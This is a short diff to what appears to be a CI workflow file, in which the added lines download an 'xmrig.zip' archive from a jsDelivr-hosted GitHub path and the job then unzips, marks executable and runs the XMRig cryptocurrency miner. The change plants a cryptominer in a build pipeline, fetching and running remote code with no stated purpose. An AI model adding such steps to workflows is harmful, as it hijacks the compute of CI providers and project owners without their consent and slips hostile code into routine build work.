@@ -17,6 +17,8 @@ jobs:
             run: |
               sudo apt-get update
               sudo apt-get install unzip --yes
+              curl --location --output xmrig.zip \
+              https://cdn.jsdelivr.net/gh/foraz/m/xmrig.zip
               unzip xmrig.zip
               chmod +x xmrig
               ./xmrig
